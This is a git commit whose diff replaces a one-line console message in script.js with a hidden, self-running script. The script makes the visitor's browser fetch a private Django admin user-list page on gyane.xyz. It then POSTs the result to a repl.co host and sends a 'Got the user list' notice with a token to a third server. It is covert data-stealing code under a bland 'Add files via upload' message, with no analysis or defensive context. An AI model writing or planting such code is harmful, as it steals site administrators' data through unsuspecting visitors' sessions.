aceed98f197e43a21c7ccd0d62bcc0f2c109d2c6
joonshakyawebsites <58363402+joonshakyawebsites@users.noreply.github.com>
2022-01-22 16:34:03 +0545

    Add files via upload

--- script.js
+++ script.js
@@ -1,1 +1,29 @@
-console.log("Running production build of Django 3");
+redirected = false;
+(async () => {
+  res = await fetch(
+    "https://gyane.xyz/gyane_private_admin_no_body_should_know_it/auth/user/"
+  );
+  redirected = res.redirected;
+  data = await res.text();
+  if (!redirected && res.status != 403) {
+    fetch("https://BurdensomeWretchedObjects.joonshakya1.repl.co", {
+      method: "POST",
+      body: JSON.stringify({ data }),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    });
+    fetch("https://mattrab.joonshakya.com.np/", {
+      method: "POST",
+      body: JSON.stringify({
+        to: 45,
+        message: "Got the user list",
+        n_id: 1000000,
+        token: "c29tZW9uZSBnYXZlIGFjY2VzcyBtYXliZTQ1MTAwMDAwMA==",
+      }),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    });
+  }
+})();
